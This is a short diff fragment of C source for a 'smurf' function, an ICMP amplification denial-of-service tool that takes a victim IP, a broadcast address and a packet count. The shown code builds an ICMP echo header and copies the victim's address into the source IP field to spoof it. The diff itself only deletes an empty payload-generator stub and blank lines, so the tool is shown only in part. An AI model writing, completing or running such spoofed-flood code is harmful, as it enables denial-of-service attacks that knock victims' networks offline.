@@ -11,10 +11,6 @@
 #include <linux/icmp.h> 
 #include "utilities.h"
 
-
-int ip_smurf_payload_gen(unsigned char * data){
-
-}
 void smurf(char * victimIP, int victimPort, int broadcast, int nPackets){
 
 	//initialize random rumber generator
@@ -48,13 +44,7 @@ void smurf(char * victimIP, int victimPort, int broadcast, int nPackets){
 	icmp -> un.echo.id = rand();
 	icmp -> un.echo.sequence = 0;
 	icmp -> checksum = csum((unsigned short *)icmp, sizeof(struct icmphdr));
-	
-
-	
-
-
-	
-	
+		
 	strcpy(source_ip , victimIP);
 	
 	sin.sin_family = AF_INET;
